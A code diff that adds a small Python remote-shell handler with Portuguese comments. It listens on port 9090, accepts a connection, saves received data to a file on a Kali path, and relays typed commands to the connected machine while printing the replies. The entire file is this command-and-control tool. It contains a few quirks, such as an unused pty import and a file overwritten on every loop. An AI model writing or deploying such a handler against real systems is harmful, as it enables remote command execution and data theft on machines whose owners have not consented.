@@ -1,0 +1,71 @@
+import socket
+import sys
+import pty
+
+# Criar o socket (conectar os dois)
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = ""
+        port = 9090
+        s = socket.socket()
+
+    except socket.error as msg:
+        print("Erro em conexão socket : " + str(msg))
+
+
+# Ouvir a conexão / Bind SOcket
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+        print("Ouvindo a porta: " + str(port))
+
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print("Erro no binding socket" + str(msg) + "\n" + "Tentando...")
+        bind_socket()
+
+
+# Estabelecendo uma conexão com o cliente (o socket tem que estar ouvindo)
+
+def socket_accept():
+    conn, address = s.accept()
+    print("Conectado com sucesso! |" + " IP " + address[0] + " | Port" + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+# Enviando o arquivo Abrindo o cmd e executando um comando
+def send_commands(conn):
+        
+        
+    while True:
+        arq = open ('/home/kali/teste/arqrec.txt', 'wb')
+        dados = conn.recv(1024)
+        arq.write(dados)
+        cmd = input()
+        
+        conn.send(str.encode(cmd))
+        client_response = str(conn.recv(1024),"utf-8")
+        print(client_response, end="")
+
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
+
+
+
+
+
+
+
